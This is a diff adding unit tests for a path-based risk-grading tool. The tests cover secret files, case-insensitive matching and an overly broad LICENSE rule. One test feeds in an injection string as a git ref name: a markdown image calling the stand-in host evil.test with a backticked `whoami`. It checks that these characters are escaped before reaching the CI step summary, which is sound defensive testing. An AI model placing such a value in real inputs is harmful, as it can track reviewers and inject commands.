@@ -123,6 +123,53 @@ class ClassifyPathTest(unittest.TestCase):
         for path in ("NOTICE.txt", "docs/glossary.txt"):
             self.assertEqual(grade_risk.classify_path(path)[0], grade_risk.R0, path)
 
+    def test_secret_material_outranks_the_docs_rules(self):
+        """Same `*.txt`-at-any-depth shadowing, on a worse surface: these
+        graded R0 "documentation", BELOW even the R2 default, so a change to a
+        secrets file was actively filtered OUT of the deep-review queue."""
+        for path in (
+            "secrets.txt",
+            "credentials.txt",
+            "ops/prod-secrets.txt",
+            "deploy/secrets.md",
+            "infra/server.key",
+            "infra/tls.pem",
+        ):
+            tier, reason = grade_risk.classify_path(path)
+            self.assertEqual(tier, grade_risk.R3, path)
+            self.assertNotEqual(reason, "documentation", path)
+
+    def test_a_secret_fixture_under_tests_is_still_a_test(self):
+        """Section 1 still wins — the hoist moved these above the DOCS rules,
+        not above the test rules, so a checked-in test credential stays R1."""
+        self.assertEqual(
+            grade_risk.classify_path("pkg/testdata/secrets.yaml")[0], grade_risk.R1
+        )
+
+    def test_matching_is_case_insensitive(self):
+        """git paths are case-sensitive but authors are not: these all missed
+        their R3 rules and fell through to the R2 default, which is both an
+        ordinary misgrade and a one-keystroke way to pick a lower tier."""
+        for path, tier in (
+            ("db/migrations/001.SQL", grade_risk.R3),
+            ("infra/Main.TF", grade_risk.R3),
+            ("config/Secrets.yaml", grade_risk.R3),
+            ("DOCKERFILE", grade_risk.R3),
+            ("svc/Auth.go", grade_risk.R3),
+            ("README.MD", grade_risk.R0),
+            ("pkg/Tests/helper.py", grade_risk.R1),
+        ):
+            self.assertEqual(grade_risk.classify_path(path)[0], tier, path)
+
+    def test_the_license_rule_does_not_swallow_ordinary_source(self):
+        """`LICENSE*` is a trailing wildcard on a common English word, and
+        case-insensitive matching turned it into a match for ordinary source —
+        grading `license_manager.py` R0, BELOW the R2 default."""
+        for path in ("svc/license_manager.py", "api/licenses.ts", "pkg/license.go"):
+            self.assertEqual(grade_risk.classify_path(path)[0], grade_risk.R2, path)
+        for path in ("LICENSE", "LICENSE-MIT", "COPYING", "LICENSE.md", "licence"):
+            self.assertEqual(grade_risk.classify_path(path)[0], grade_risk.R0, path)
+
     def test_a_codeowners_fixture_under_tests_is_still_a_test(self):
         """Section 1 still wins: a fixture is not the repo's live policy."""
         self.assertEqual(
@@ -565,6 +612,25 @@ class ShellEntrypointTest(unittest.TestCase):
             report = json.load(fh)
         self.assertEqual(report["status"], "unknown")
         self.assertIsNone(report["label"])
+
+    def test_the_stderr_note_cannot_inject_markdown_into_the_step_summary(self):
+        """emit_unknown's stderr carries git's own message, which quotes
+        PR-authored path names, and pr-risk.yml pipes this step through
+        `tee -a "$GITHUB_STEP_SUMMARY"` — so an unescaped echo renders
+        PR-controlled markdown (a remote image that logs reviewer IPs, a link)
+        verbatim in the run summary."""
+        d = self._repo()
+        out = tempfile.mkdtemp()
+        # A ref git cannot resolve, whose NAME is the injection vector: it is
+        # echoed back in git's "unknown revision" diagnostic.
+        evil = "![x](https://evil.test/`whoami`)<img src=x>"
+        proc = self._sh(
+            "--base", evil, "--head", "HEAD", "--out-dir", out, "--repo-dir", d
+        )
+        self.assertEqual(proc.returncode, 0, proc.stderr)
+        for char in "![]()`<>":
+            self.assertNotIn(char, proc.stderr, f"{char!r} reached the step summary")
+        self.assertIn("grade-risk.sh:", proc.stderr)
 
     def test_missing_refs_are_unknown_not_a_crash(self):
         out = tempfile.mkdtemp()
